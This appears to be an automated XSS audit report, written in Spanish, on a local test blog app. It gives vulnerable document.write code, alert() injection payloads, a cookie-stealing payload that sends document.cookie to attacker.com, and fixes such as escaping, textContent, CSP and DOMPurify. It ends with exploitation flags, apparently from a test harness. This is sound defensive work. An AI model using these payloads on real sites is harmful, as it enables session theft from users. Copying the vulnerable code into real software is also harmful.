# Informe de Análisis de Vulnerabilidades XSS
**Target:** http://web.dev.local:8082  
**Fecha:** 2026-04-27T15:34:20  
**Analista:** Automated Security Audit  
**Tipo de análisis:** Cross-Site Scripting (XSS)

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades XSS** en la aplicación web "Blog de Recetas". Ambas son de tipo DOM-based XSS debido a que el procesamiento ocurre completamente en el lado del cliente mediante JavaScript sin ningún tipo de sanitización.

| Vulnerabilidad | Parámetro | Tipo | Severidad |
|---|---|---|---|
| XSS en búsqueda | `search` | DOM-based Reflected | **Alta** |
| XSS en comentarios | `name`, `comment` | DOM-based Stored (localStorage) | **Alta** |

---

## Detalles Técnicos

### Vulnerabilidad 1: DOM-based XSS en parámetro `search`

**URL vulnerable:** `http://web.dev.local:8082/?search=<PAYLOAD>`

**Código vulnerable:**
```javascript
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

El valor del parámetro `search` se obtiene directamente de `URLSearchParams` y se inserta en el DOM mediante `document.write()` **sin ningún tipo de codificación o sanitización**. Esto permite inyectar HTML/JavaScript arbitrario.

**Payload de prueba:**
```
http://web.dev.local:8082/?search=<script>alert('XSS')</script>
```

**Payload alternativo (bypass):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS_REFLECTED')>
```

**Impacto:** Un atacante puede compartir un enlace malicioso que, al ser visitado por la víctima, ejecuta código JavaScript arbitrario en el contexto del navegador de la víctima.

---

### Vulnerabilidad 2: DOM-based Stored XSS en sección de comentarios

**Parámetros vulnerables:** `name`, `comment`

**Código vulnerable:**
```javascript
// Almacenamiento sin sanitización
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado sin sanitización
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Los valores de `name` y `comment` se almacenan en `localStorage` sin sanitizar y se recuperan y renderizan directamente en el DOM mediante `document.write()`. Esto constituye un **Stored XSS** persistente para el mismo navegador/perfil.

**Payload de prueba:**
```
http://web.dev.local:8082/?name=<script>alert('XSS_STORED')</script>&comment=test
```

**Payload para robo de cookies:**
```
http://web.dev.local:8082/?name=Hacker&comment=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**Impacto:** El payload se almacena en `localStorage` y se ejecuta cada vez que el usuario accede a la página, hasta que el almacenamiento sea limpiado.

---

## Explotación Confirmada

### PoC - Reflected XSS (search)
- **Vector:** `document.write()` con valor no sanitizado de `URLSearchParams`
- **Contexto de ejecución:** HTML context (dentro de elemento `<strong>`)
- **URL de explotación:** `http://web.dev.local:8082/?search=<script>alert(document.domain)</script>`

### PoC - Stored XSS (comentarios vía localStorage)
- **Vector:** `document.write()` con datos recuperados de `localStorage`
- **Contexto de ejecución:** HTML context (dentro de `<div>`)
- **Persistencia:** localStorage del navegador

---

## Escenarios de Ataque

1. **Robo de sesión/cookies:** Exfiltrar cookies de sesión si existen
2. **Phishing/Defacement:** Modificar el contenido de la página para engañar a usuarios
3. **Keylogging:** Capturar pulsaciones de teclado del usuario
4. **Redirección maliciosa:** Enviar al usuario a sitios phishing
5. **CSRF token theft:** Robar tokens anti-CSRF para ejecutar acciones no autorizadas

---

## Recomendaciones

### Corrección inmediata
1. **Sanitizar todas las entradas** antes de insertarlas en el DOM:
   ```javascript
   function escapeHtml(text) {
       const div = document.createElement('div');
       div.appendChild(document.createTextNode(text));
       return div.innerHTML;
   }
   // Uso: document.write('<strong>' + escapeHtml(searchTerm) + '</strong>');
   ```

2. **Reemplazar `document.write()`** con métodos DOM seguros:
   ```javascript
   const el = document.createElement('p');
   el.textContent = 'Resultados para: ' + searchTerm; // textContent escapa HTML
   container.appendChild(el);
   ```

3. **Implementar Content Security Policy (CSP):**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```

4. **Validar y sanitizar datos al escribir en localStorage** y al leer de él.

5. **Usar bibliotecas de sanitización** como DOMPurify para contenido HTML dinámico.

---

## Conclusión

La aplicación presenta vulnerabilidades XSS críticas derivadas del uso incorrecto de `document.write()` con datos no sanitizados provenientes de la URL y del `localStorage`. Se recomienda aplicar las correcciones indicadas con carácter urgente.

**VULN_FOUND:** true  
**VULN_EXPLOITED:** true
